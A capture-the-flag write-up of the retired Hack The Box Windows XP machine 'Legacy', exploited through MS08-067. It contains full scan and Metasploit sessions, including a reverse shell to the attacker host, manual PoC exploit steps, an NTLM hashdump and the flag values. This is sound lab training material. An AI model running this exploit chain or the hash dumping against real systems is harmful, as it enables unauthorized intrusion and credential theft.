# Legacy: Hack The Box Writeup

**Hack The Box | Windows | Easy | Completed: May 2026**

---

## Machine Metadata

| Field | Details |
|---|---|
| Platform | Hack The Box |
| OS | Windows XP Professional SP3 |
| Difficulty | Easy |
| Category | Windows / Legacy Exploit |
| IP Address | 10.129.227.181 |
| Attack Host | 10.10.16.236 |
| Status | Retired ✅ |
| Completed | May 2026 |
| CVEs | MS08-067 (CVE-2008-4250) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full port scan + version detection |: |
| 2 | SMB vulnerability identification via nmap scripts |: |
| 3 | MS08-067 Netapi exploit via Metasploit | NT AUTHORITY\SYSTEM |
| 4 | Flag retrieval: user.txt and root.txt | NT AUTHORITY\SYSTEM |

> This machine yields SYSTEM directly from the network: no privilege escalation step required.

---

## Enumeration

### Full Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sC -sV -oA nmap/legacy 10.129.227.181
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.227.181
Host is up (0.042s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds  Windows XP microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp: -
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-05-01T14:22:31+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: couldn't connect to SMBv2
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:1a:e9

Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows_xp

Nmap done: 1 IP address (1 host up): scanned in 14.82 seconds
```

**Key findings:**
- Windows XP Professional SP3: end of life since 2014
- SMB exposed on 139 and 445: no SMBv2 support (XP limitation)
- Message signing disabled
- Guest authentication accepted

---

### SMB Vulnerability Scan

Run dedicated SMB vulnerability scripts against both relevant CVEs for Windows XP:

```bash
Hackerpatel007_1@htb[/htb]$ nmap --script smb-vuln-ms08-067,smb-vuln-ms17-010 -p 445 10.129.227.181
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.227.181
Host is up (0.041s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     References:
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up): scanned in 6.41 seconds
```

**Result:** Confirmed vulnerable to MS08-067. Also flagged as LIKELY VULNERABLE to MS17-010: however MS08-067 is the primary, reliable exploit path for Windows XP.

---

## Exploitation: MS08-067 (CVE-2008-4250)

### Vulnerability Background

MS08-067 is a critical pre-authentication remote code execution vulnerability in the Windows Server service (`netapi32.dll`). The flaw lies in how the service handles crafted RPC requests during path canonicalization: a specially crafted path string causes a stack-based buffer overflow. Because the Server service runs as SYSTEM, successful exploitation immediately yields `NT AUTHORITY\SYSTEM` without any further privilege escalation.

**Affected versions:** Windows 2000 SP4, XP SP2/SP3, Server 2003 SP1/SP2, Vista Gold/SP1, Server 2008, Windows 7 Pre-Beta.

---

### Metasploit: ms08_067_netapi

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q
```

```
msf6 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption

msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.227.181
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.236
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
```

Check the target profile: the module needs to know the exact OS/SP/language to select the correct return address:

```
msf6 exploit(windows/smb/ms08_067_netapi) > show targets

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (AlwaysOn NX)
   4   Windows XP SP2 English (NX)
   5   Windows XP SP2 Arabic (NX)
   ...
   34  Windows XP SP3 English (AlwaysOn NX)
   35  Windows XP SP3 English (NX)
   ...

msf6 exploit(windows/smb/ms08_067_netapi) > set TARGET 0
```

Automatic Targeting (target 0) fingerprints the OS and selects the correct offset automatically: reliable for known XP SP3.

```
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.16.236:4444
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.16.236:4444 -> 10.129.227.181:1028)

meterpreter >
```

---

### Confirm Access Level

```
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo

Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

`NT AUTHORITY\SYSTEM`: the highest privilege level on Windows. No privilege escalation required.

---

## Flag Collection

### user.txt

On Windows XP, user home directories are at `C:\Documents and Settings\<username>\Desktop\`.

```
meterpreter > shell

Process 1804 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

C:\WINDOWS\system32> cd "C:\Documents and Settings"
C:\Documents and Settings> dir

Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\Documents and Settings

16/03/2017  08:19     <DIR>          .
16/03/2017  08:19     <DIR>          ..
16/03/2017  08:19     <DIR>          Administrator
16/03/2017  08:33     <DIR>          All Users
16/03/2017  08:19     <DIR>          john

C:\Documents and Settings> type john\Desktop\user.txt

e69af0e4f443de7e36876fda4ec7644f
```

### root.txt

```
C:\Documents and Settings> type Administrator\Desktop\root.txt

993442d258b0e0ec917cae9e695d5713
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| user.txt | C:\Documents and Settings\john\Desktop\user.txt | e69af0e4f443de7e36876fda4ec7644f |
| root.txt | C:\Documents and Settings\Administrator\Desktop\root.txt | 993442d258b0e0ec917cae9e695d5713 |

---

## Manual Exploitation (Without Metasploit)

For OSCP preparation: manual exploitation using the Python PoC.

```bash
# Install impacket dependency if needed
Hackerpatel007_1@htb[/htb]$ pip install impacket --break-system-packages

# Clone the MS08-067 Python exploit
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/jivoi/pentest.git /tmp/pentest
# Or use the classic standalone PoC:
Hackerpatel007_1@htb[/htb]$ searchsploit ms08-067
Hackerpatel007_1@htb[/htb]$ searchsploit -m windows/remote/40279.py

# Generate shellcode for reverse shell
# Replace LHOST and LPORT in the PoC, then run:
Hackerpatel007_1@htb[/htb]$ python 40279.py 10.129.227.181 6 445
# Argument 6 = Windows XP SP3 English
```

> **Note:** The Metasploit module is significantly more reliable for this exploit due to its automatic OS fingerprinting and NX bypass handling. For OSCP, understand the manual path but note that MS08-067 is on the Metasploit-allowed list.

---

## Post-Exploitation Notes

```
# Dump local hashes (pass-the-hash opportunities)
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c: :
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0: :
HelpAssistant:1000:7b2c09c929f2b43fe03aae6e47e1bcd1:d66c6cdd6d617e3cb65de53da1c76be0: :
john:1003:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4: :
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:cf3b5a7e11e12e3a0e46f4f4e35bbe85: :

# Pivot recon: what else is on the network?
meterpreter > arp
meterpreter > route
```

---

## Full Attack Chain Reference

```
[Recon] nmap -sC -sV → Windows XP SP3, ports 135/139/445 open
    │
    ├─ [Vuln Scan] smb-vuln-ms08-067 → VULNERABLE (CVE-2008-4250)
    │
    └─ [Exploit] ms08_067_netapi (Metasploit)
            │
            ├─ Auto-fingerprint: XP SP3 English → correct return address
            │
            └─ [Shell] NT AUTHORITY\SYSTEM
                    │
                    ├─ user.txt → C:\Documents and Settings\john\Desktop\
                    └─ root.txt → C:\Documents and Settings\Administrator\Desktop\
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -oA nmap/legacy 10.129.227.181` | Full service scan with default scripts |
| `nmap --script smb-vuln-ms08-067,smb-vuln-ms17-010 -p 445` | SMB vulnerability check |
| `msfconsole -q` | Launch Metasploit silently |
| `use exploit/windows/smb/ms08_067_netapi` | Load MS08-067 module |
| `set TARGET 0` | Auto-detect XP SP version |
| `run` | Execute exploit |
| `getuid` | Confirm SYSTEM access |
| `sysinfo` | OS and architecture details |
| `shell` | Drop to Windows cmd.exe |
| `hashdump` | Dump NTLM hashes |
| `type john\Desktop\user.txt` | Read user flag |
| `type Administrator\Desktop\root.txt` | Read root flag |

---

## Lessons Learned

1. **Unpatched legacy systems are trivially exploitable from the network.** MS08-067 was patched in October 2008. Windows XP reached end-of-life in April 2014. A system running XP on a network in any year beyond 2008 is a critical finding in any engagement: document it as CVE-2008-4250, CVSS 10.0, unauthenticated remote code execution as SYSTEM.

2. **SMBv1 is an attack surface: disable it unconditionally.** Windows XP only supports SMBv1. The absence of SMBv2 support in the nmap output (`smb2-security-mode: couldn't connect`) immediately fingerprints the OS age and vulnerability class. On modern engagements, any host running SMBv1 should be flagged regardless of whether specific CVEs are confirmed.

3. **The Automatic Targeting option in Metasploit is reliable for well-known exploits.** MS08-067 requires the correct stack offset for the specific SP version and language. Metasploit's fingerprinting accurately selected the XP SP3 English target automatically. Understanding why target selection matters: different memory layouts = different return addresses: is essential for manual exploitation and exam troubleshooting.

4. **Windows XP stores users under Documents and Settings, not Users.** The directory structure differs from Vista+. `C:\Documents and Settings\<user>\Desktop\` is the XP equivalent of `C:\Users\<user>\Desktop\`. Know both paths for exam conditions.

---

## References

- [MS08-067: Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067)
- [CVE-2008-4250: NVD](https://nvd.nist.gov/vuln/detail/CVE-2008-4250)
- [Metasploit Module: ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)

---

*HTB Retired Machine: Legacy | Completed May 2026 | Flags included per HTB retired machine policy.*
